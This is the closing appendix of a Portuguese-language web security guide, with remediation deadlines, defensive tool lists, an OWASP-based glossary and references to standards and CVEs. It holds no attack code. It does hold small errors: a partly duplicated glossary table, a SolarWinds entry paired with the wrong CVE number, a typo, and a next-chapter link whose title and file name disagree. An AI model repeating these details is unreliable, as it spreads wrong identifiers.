| Alta (7.0-8.9) | 1 semana |
| Media (4.0-6.9) | 1 mes |
| Baixa (0.0-3.9) | Proximo release |

### Ferramentas Recomendadas por Categoria

| Categoria | Ferramentas |
|-----------|------------|
| SAST | Semgrep, Bandit, ESLint Security, Gosec |
| DAST | OWASP ZAP, Burp Suite, Nuclei |
| SCA | Snyk, OWASP Dependency-Check, pip-audit |
| Container | Trivy, Grype, Docker Bench |
| Secrets | GitLeaks, TruffleHog, detect-secrets |
| IaC | Checkov, tfsec, KICS |
| API | Postman, Insomnia, RESTler |

---

## Apêndice G: Glossário

### Termos Técnicos

| Termo | Definição |
|-------|-----------|
| **A01: Broken Access Control** | Falha que permite acesso nao autorizado a funcionalidades ou dados |
| **A02: Cryptographic Failures** | Falhas na protecao criptografica de dados sensiveis |
| **A03: Injection** | Injecao de codigo malicioso em interpretadores |
| **A04: Insecure Design** | Vulnerabilidades originadas em falhas de design arquitetural |
| **A05: Security Misconfiguration** | Configuracoes de seguranca incorretas ou padrao |
| **A06: Vulnerable Components** | Uso de componentes com vulnerabilidades conhecidas |
| **A07: Authentication Failures** | Falhas na verificacao de identidade |
| **A08: Integrity Failures** | Falhas na verificacao de integridade de software e dados |
| **A09: Logging Failures** | Logging e monitoramento insuficientes |
| **A10: SSRF** | Forgery de request server-side para destinos arbitrarios |

### Termos Gerais

| Termo | Definição |
|-------|-----------|
| **ASVS** | Application Security Verification Standard |
| **Backdoor** | Porta dos fundos digital que permite acesso nao autorizado |
| **Brute Force** | Tentativa sistematica de todas as combinacoes possiveis |
| **CORS** | Cross-Origin Resource Sharing — politica de compartilhamento de recursos |
| **CSP** | Content Security Policy — politica de seguranca de conteudo |
| **CSRF** | Cross-Site Request Forgery — falsificacao de requisicao entre sites |
| **CVSS** | Common Vulnerability Scoring System — sistema de pontuacao de vulnerabilidades |
| **CVE** | Common Vulnerabilities and Exposures — base de dados publica de vulnerabilidades |
| **CWE** | Common Weakness Enumeration — enumeracao de fraquezas comuns |
| **DAST** | Dynamic Application Security Testing — teste de seguranca dinamico |
| **Defense in Depth** | Estrategia de multiplas camadas de seguranca |
| **Deny by Default** | Politica de negar tudo que nao esta explicitamente permitido |
| **DNS Rebinding** | Ataque que manipula resolucao DNS para contornar protecoes |
| **Fail-Secure** | Comportamento de falha que mantem o estado seguro |
| **HSTS** | HTTP Strict Transport Security — forca uso de HTTPS |
| **HMAC** | Hash-based Message Authentication Code — codigo de autenticacao |
| **IDOR** | Insecure Direct Object Reference — referencia insegura a objetos |
| **JNDI** | Java Naming and Directory Interface — interface de nomenclatura |
| **Key Rotation** | Rotacao periodica de chaves criptograficas |
| **Least Privilege** | Principio de menor privilegio — conceder apenas o necessario |
| **MFA** | Multi-Factor Authentication — autenticacao multifator |
| **NIST** | National Institute of Standards and Technology |
| **OGNL** | Object-Graph Navigation Language — linguagem de navegacao de grafos |
| **OWASP** | Open Web Application Security Project |
| **PASTA** | Process for Attack Simulation and Threat Analysis |
| **PBKDF2** | Password-Based Key Derivation Function 2 |
| **Perfect Forward Secrecy** | Propriedade que garante que chaves de sessao antighanadas nao comprometam sessoes futuras |
| **RCE** | Remote Code Execution — execucao remota de codigo |
| **SAST** | Static Application Security Testing — teste de seguranca estatico |
| **SBOM** | Software Bill of Materials — lista de materiais de software |
| **SCA** | Software Composition Analysis — analise de composicao de software |
| **SIEM** | Security Information and Event Management |
| **STRIDE** | Spoofing, Tampering, Repudiation, Information Disclosure, DoS, Elevation |
| **Supply Chain Attack** | Ataque que compromete componentes da cadeia de suprimentos |
| **Threat Modeling** | Processo de identificacao e avaliacao de ameacas |
| **TLS** | Transport Layer Security — protocolo de seguranca em transportes |
| **TOTP** | Time-based One-Time Password — senha unica baseada em tempo |
| **WAF** | Web Application Firewall — firewall de aplicacao web |
| **XSS** | Cross-Site Scripting — injecao de scripts entre sites |
| **Zero Trust** | Modelo de seguranca que nao confia em nenhum usuario ou dispositivo por padrao |
|-------|-----------|
| **ASVS** | Application Security Verification Standard |
| **CVSS** | Common Vulnerability Scoring System |
| **CWE** | Common Weakness Enumeration |
| **CVE** | Common Vulnerabilities and Exposures |
| **DAST** | Dynamic Application Security Testing |
| **HSTS** | HTTP Strict Transport Security |
| **IDOR** | Insecure Direct Object Reference |
| **MFA** | Multi-Factor Authentication |
| **OWASP** | Open Web Application Security Project |
| **RCE** | Remote Code Execution |
| **SAST** | Static Application Security Testing |
| **SBOM** | Software Bill of Materials |
| **SCA** | Software Composition Analysis |
| **SIEM** | Security Information and Event Management |
| **SSRF** | Server-Side Request Forgery |
| **TLS** | Transport Layer Security |
| **WAF** | Web Application Firewall |
| **XSS** | Cross-Site Scripting |

---

## Referências

### Documentos Oficiais OWASP

- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [OWASP ASVS](https://owasp.org/www-project-application-security-verification-standard/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Proactive Controls](https://owasp.org/www-project-proactive-controls/)
- [OWASP API Security Top 10](https://owasp.org/API-Security/)
- [OWASP Dependency-Check](https://owasp.org/www-project-dependency-check/)

### CVEs e Vulnerabilidades

- [CVE-2014-0160 (Heartbleed)](https://nvd.nist.gov/vuln/detail/CVE-2014-0160)
- [CVE-2017-5638 (Apache Struts)](https://nvd.nist.gov/vuln/detail/CVE-2017-5638)
- [CVE-2019-11091 (MDS)](https://nvd.nist.gov/vuln/detail/CVE-2019-11091)
- [CVE-2020-14001 (SolarWinds)](https://nvd.nist.gov/vuln/detail/CVE-2020-14001)
- [CVE-2021-44228 (Log4Shell)](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [CVE-2023-34362 (MOVEit)](https://nvd.nist.gov/vuln/detail/CVE-2023-34362)
- [CVE-2024-6387 (regreSSHion)](https://nvd.nist.gov/vuln/detail/CVE-2024-6387)
- [CVE-2024-3094 (XZ Utils)](https://nvd.nist.gov/vuln/detail/CVE-2024-3094)

### Ferramentas de Segurança

- [OWASP ZAP](https://www.zaproxy.org/)
- [Burp Suite](https://portswigger.net/burp)
- [Snyk](https://snyk.io/)
- [Semgrep](https://semgrep.dev/)
- [Bandit (Python)](https://bandit.readthedocs.io/)
- [ESLint Security](https://github.com/nodesecurity/eslint-plugin-security)
- [npm audit](https://docs.npmjs.com/auditing-package-dependencies-for-security-vulnerabilities)
- [pip-audit](https://pypi.org/project/pip-audit/)
- [Safety](https://pyup.io/packages/package/safety/)

### Livros e Publicações

- *The Web Application Hacker's Handbook* — Dafydd Stuttard, Marcus Pinto
- *Web Application Security: Exploitation and Countermeasures* — Andrew Hoffman
- *Hacking: The Art of Exploitation* — Jon Erickson
- *Security Engineering* — Ross Anderson
- *The Tangled Web* — Michal Zalewski
- *Real-World Cryptography* — David Wong

### Normas e Padrões

- [NIST SP 800-63B](https://pages.nist.gov/800-63-3/sp800-63b.html) — Digital Identity Guidelines
- [PCI DSS v4.0](https://www.pcisecuritystandards.org/document_library/) — Payment Card Industry
- [SOC 2 Type II](https://www.aicpa.org/interestareas/frc/assuranceadvisoryservices/aicpasoc2report.html)
- [ISO 27001](https://www.iso.org/iso-27001-information-security.html)
- [GDPR](https://gdpr.eu/) — General Data Protection Regulation
- [LGPD](https://www.planalto.gov.br/ccivil_03/_ato2015-2018/2018/lei/l13709.htm) — Lei Geral de Proteção de Dados

### Comunidades e Recursos

- [OWASP Local Chapters](https://owasp.org/chapters/)
- [HackerOne](https://www.hackerone.com/)
- [Bugcrowd](https://www.bugcrowd.com/)
- [CVE Details](https://www.cvedetails.com/)
- [Exploit Database](https://www.exploit-db.com/)
- [SANS Institute](https://www.sans.org/)
- [NIST National Vulnerability Database](https://nvd.nist.gov/)

---

> *"Segurança não é um produto, é um processo. Não é uma features, é uma cultura."*
> — Bruce Schneier

---

**Próximo Capítulo**: [Capítulo 04 — Threat Modeling](04-sql-injection.md) - Aprenda a identificar, quantificar e priorizar ameaças antes que elas se tornem vulnerabilidades.
